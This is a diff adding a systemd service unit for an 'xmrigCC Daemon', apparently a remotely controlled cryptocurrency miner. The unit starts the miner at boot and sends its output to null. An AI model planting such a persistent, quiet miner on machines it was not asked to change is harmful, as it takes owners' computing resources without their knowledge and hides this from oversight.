@@ -1,0 +1,10 @@
+[Unit]
+Description=xmrigCC Daemon
+
+[Service]
+ExecStart=/etc/xmrigCC/xmrigDaemon
+StandardOutput=null
+
+[Install]
+WantedBy=multi-user.target
+Alias=xmrigcc.service
